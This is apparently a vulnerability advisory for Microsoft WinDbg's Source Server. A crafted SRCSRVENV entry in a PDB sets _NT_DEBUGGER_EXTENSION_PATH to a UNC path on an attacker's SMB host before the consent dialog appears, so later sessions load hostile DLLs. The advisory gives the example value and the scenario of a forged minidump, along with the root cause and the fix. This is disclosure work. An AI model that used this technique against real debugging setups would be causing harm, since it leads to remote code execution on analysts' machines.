**Summary**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Microsoft WinDbg with Source Server enabled. Access from target host to attacker-supplied SMB-share is required to exploit this vulnerability remotely. The specific flaw exists within the implementation of the SRCSRV Stream processing of pdb file by srcsrv.dll. The issue results from the improper usage of SRCSRVENV variable in SRCSRV stream of pdb file, which allows attacker to set arbitrary environment variable in current WinDbg instance. This behaviour may be abused to trigger DLL hijacking during DbgEngine reinitialization, and result in arbitrary DLL execution, including DLLs accessible by UNC paths, e.g. from an SMB server.

**Description**

**Products affected**

- WinDbg 10.0.19041.685
- Microsoft Source Server (srcsrv.dll) 10.0.19041.685

**Classification**

- Security feature bypass
- Local privilege elevation
- Remote code execution
- Code injection

**Details**

WinDbg has feature called Source Indexing which allows developers to embed instructions to WinDbg on how to download source code for specific build of a PE file. These instructions are presented within a form of "ini" file, which can be embedded to a "srcsrv" stream of a PDB file, which is generated by MSVC compiler alongside to executable file, to provide additional debug information for the application. ![](/assets/img/1/clip_image001.png)

Srcsrv stream content example

This ini files contain the following main keys:

- SRCSRVCMD - specifies command line template which actually downloads source code, e.g. "tf.exe get …"
- SRCSRVENV - specifies environment variables for SRCSRVCMD in form of "KEY=VALUE"

To mitigate execution of malicious command lines, default configuration of SrcSrv requires user consent before execution, which allows user to decide if the command is safe or not. User also has option to turn off those consents permanently. Srcsrv.dll uses SRCSRVENV value to set environment variable in current WinDbg instance before the consent window, which renders this security measure ineffective.

Source server consent dialog

**Attack scenario (remote)**

Company X uses dump servers to collect crashdumps from customers for postmortem debugging of their software. Malicious actors craft a PDB file which triggers this vulnerability: they embed a SRCSRV stream to PDB with SRCSRVENV set to: **_NT_DEBUGGER_EXTENSION_PATH=\someserver.com\pub\**

Example setting

This specific environment variable is used by Windbg engine as a search path for extension DLLs, which will be explained later.

They also craft a minidump file with a PE file in memory containing forged CV_INFO_PDB70 structure, and a PDB file which triggers this vulnerability. This structure is a standard way to point WinDbg to a location of a PDB file for a PE.

Default value of PDB path in CV_INFO_PDB70 structure

 In this case, attacker sets PdbFileName to a UNC path to SMB share, which contains a .pdb file with a crafted SRCSRV stream. Employee of Company X receives minidump file for crashdump analysis, and opens it in WinDbg, which loads a .pdb file from the SMB share. WinDbg identifies SRCSRV stream from PDB, and passes SRCSRV stream contents to srcsrv.dll SrcSrvExecTokenA function. This function reads SRCSRVENV variable and sets environment variable _NT_DEBUGGER_EXTENSION_PATH. At this point the vulnerability is triggered. Later it displays consent window, but no matter of user consent, the WinDbg instance has spoiled process environment. After dealing with this crafted minidump, employee of Company X opens any minidump or executable binary (in the current WinDbg instance), and DbgEngine will load extension DLLs from the attacker-supplied SMB share.

WinDbg loads attacker-supplied DLL

Current attack scenario is based on _NT_DEBUGGER_EXTENSION_PATH variable modification, which is basically a path to WinDbg debugger extensions like ext.dll/ntsdexts.dll/etc. They are being loaded at DbgEngine initialization, so the DLL hijacking will occur if user loads any other dump in current WinDbg instance.

**Root cause and remediation**

SRCSRVENV is meant to provide environment variables to SRCSRVCMD command execution, so it must be specified e.g. on lpEnvironment argument of CreateProcess call, not for context of calling process using SetEnvironmentVariable.

**Fix available**

Ensure to use SDK version 10.0.22621.0 and higher.
